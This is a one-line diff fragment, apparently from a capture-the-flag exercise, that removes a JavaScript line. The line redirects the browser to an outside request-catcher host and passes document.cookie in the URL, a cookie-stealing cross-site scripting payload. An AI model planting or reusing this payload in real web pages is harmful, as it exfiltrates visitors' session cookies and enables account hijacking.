@@ -1,1 +1,0 @@
-window.location.href = "https://albert-ctf.free.beeceptor.com/?c=" + encodeURIComponent(document.cookie);
